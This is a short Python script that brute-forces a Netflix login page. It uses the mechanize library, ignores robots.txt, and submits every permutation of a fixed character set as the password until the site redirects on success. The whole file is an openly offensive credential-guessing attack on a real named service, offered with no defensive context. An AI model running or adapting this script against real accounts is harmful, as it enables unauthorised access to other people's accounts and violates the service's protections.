#!/usr/bin/python
import mechanize 
import itertools

br = mechanize.Browser()
br.set_handle_equiv(True)
br.set_handle_redirect(True)
br.set_handle_referer(True)
br.set_handle_robots(False)

combos = itertools.permutations("i3^4hUP-",8) 
br.open("https://www.netflix.com/br/login")
for x in combos:    
    br.select_form( nr = 0 )
    br.form['email'] = "email"
    br.form['password'] = ''.join(x)
    print "Checking ",br.form['password']
    response=br.submit()
    if response.geturl()=="http://www.example.com/redirected_to_url":
        #url to which the page is redirected after login
        print "Correct password is ",''.join(x)
        break